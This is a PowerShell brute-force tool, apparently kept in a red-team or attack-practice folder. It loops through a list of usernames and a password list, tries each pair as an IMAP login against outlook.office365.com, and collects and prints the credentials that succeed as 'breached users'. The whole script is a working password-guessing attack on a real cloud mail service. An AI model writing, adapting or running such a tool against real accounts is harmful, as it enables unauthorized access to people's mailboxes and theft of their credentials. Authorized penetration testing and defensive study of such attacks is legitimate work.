﻿
$usersList = Get-Content 'C:\Users\JeffL\Desktop\att&ck\-1. ExternalRecon\BruteForceTool\NinjaUsers.txt'
$passwordList = Get-Content 'C:\Users\JeffL\Desktop\att&ck\-1. ExternalRecon\BruteForceTool\passwordlist.txt'

$server = 'outlook.office365.com'
$port = 993
$useSsl = $true

$breachedUsers = @()

foreach ($user in $usersList) {

    foreach($password in $passwordList) {

    # Load the IMAPX DLL assembly
    $dll = 'C:\Users\JeffL\Desktop\att&ck\-1. ExternalRecon\BruteForceTool\ImapX\ImapX.dll' 

    [Reflection.Assembly]::LoadFile($dll) | Out-Null



    $client.Behavior.MessageFetchMode = "Full"


    # Initialize the IMAP client
    $client = New-Object ImapX.ImapClient -ArgumentList $server, $useSsl


    if($client.Connect()) {
     
        if($client.Login($user, $password)) {
          
             Write-Host "$user : IMAP connected successfully !" -ForegroundColor Green
             
             $properties = @{Username = $user; Password = $password}
             $obj = New-Object -TypeName psobject -Property $properties
             $breachedUsers += $obj
        }

        else {
     
          Write-Host "$user :IMAP connection failed !" -ForegroundColor Red
        }

    }
    else {
     
          Write-Host "$user :IMAP connection failed !" -ForegroundColor Red
    }
        
    }
}

Write-Host -ForegroundColor Yellow "Guessed passwords:"
$breachedUsers